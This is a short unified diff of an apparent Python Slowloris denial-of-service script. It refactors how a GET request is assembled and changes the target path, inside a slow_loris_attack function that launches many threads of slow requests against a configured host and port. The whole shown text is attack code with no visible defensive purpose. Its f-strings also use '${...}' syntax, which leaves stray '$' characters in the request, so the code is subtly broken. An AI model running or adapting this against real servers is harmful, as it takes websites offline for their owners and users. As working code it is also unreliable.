@@ -36,18 +36,18 @@ def slow_request(name: str, http_request: str):
 
 
 def as_get_request(path: str):
-    method = f'GET ${path} HTTP/1.1'
-    headers = [
+    lines = [
+        f'GET ${path} HTTP/1.1',
         'Accept: text/html',
         'Cache-Control: no-cache',
         'Connection: keep-alive',
         f'Host: ${HOST}:${PORT}'
     ]
-    return '\r\n'.join([method] + headers) + '\r\n'
+    return '\r\n'.join(lines) + '\r\n'
 
 
 def slow_loris_attack():
-    get_request = as_get_request("/popular-shop")
+    get_request = as_get_request("/shop")
 
     for request_num in range(NUM_REQUESTS_TO_START):
         threading.Thread(target=slow_request, args=(str(request_num), get_request,)).start()
